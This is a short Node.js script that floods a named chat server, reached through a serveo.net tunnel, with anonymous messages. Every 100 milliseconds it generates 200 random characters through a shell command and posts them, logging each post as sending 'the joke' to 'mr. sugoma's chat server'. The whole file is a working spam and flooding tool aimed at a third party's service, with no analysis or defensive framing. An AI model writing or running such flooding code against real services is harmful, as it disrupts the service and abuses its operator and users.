const { exec } = require('node:child_process');
const fs = require('node:fs');

const chatHost = 'https://44464cc48710e0676d7881b606761201.serveo.net/send.php';

setInterval(() => {
(async () => {
    const formData = new FormData();
    formData.append('login', 'anonymous');
    formData.append('password', '');

    exec('tr -dc A-Za-z0-9 </dev/urandom | head -c 200 > output.txt;', async (error, stdout, stderr) => {
        if (error) {
            console.error(`exec error: ${error}`);
            return;
        }

        const fileContent = fs.readFileSync('./output.txt').toString('utf-8');
        formData.append('message', fileContent);
    });

    console.log('sending the "joke"');

    setTimeout(async () => {
    // sending request to mr. sugoma's chat server
    const msgReq = await fetch(chatHost, {
        method: 'post',
        body: formData
    }).catch(e => console.error(`Error: ${e.message} (host: ${chatHost})`));

    const msgRes = await msgReq?.text();

    if (msgReq?.status === 200) {
        console.log('successfully sent the joke');

        console.log(`*- server response -*\ncode: ${msgReq?.status} ${msgReq?.statusText}\n*- server response -*\n`);
    } else {
        console.error('error when sending the joke');
        console.log(`*- server error -*\ncode: ${msgReq?.status} ${msgReq?.statusText}\nraw response: ${msgRes}\n*- server error -*\n`);
    }
    }, 100);
})();
}, 100);

